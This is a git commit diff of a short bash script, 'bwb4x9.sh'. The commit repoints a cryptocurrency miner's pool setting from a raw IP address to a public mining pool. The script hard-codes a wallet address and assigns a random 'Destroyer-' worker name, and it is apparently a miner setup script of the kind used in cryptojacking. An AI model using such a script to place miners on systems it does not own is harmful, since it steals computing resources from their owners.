09560b95b17dae05e44368e89ad082de9bf7dc0d
tungtungtun <enginemaker31@gmail.com>
2025-07-22 11:09:15 +0530

    Update bwb4x9.sh

--- bwb4x9.sh
+++ bwb4x9.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 WALLET="4AVDqZyeuTeDgVeASR83DRdokorjq8sgkav7NcQB66hZR2kDgF5rPpyPWSv1RjpjbrXZQaQPmqpzoUFRPfD9PgFFSckTFkj"
-POOL="31.97.58.247:2222"
+POOL="pool.hashvault.pro:8888"
 WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"
 
 echo "[+] Starting setup..."
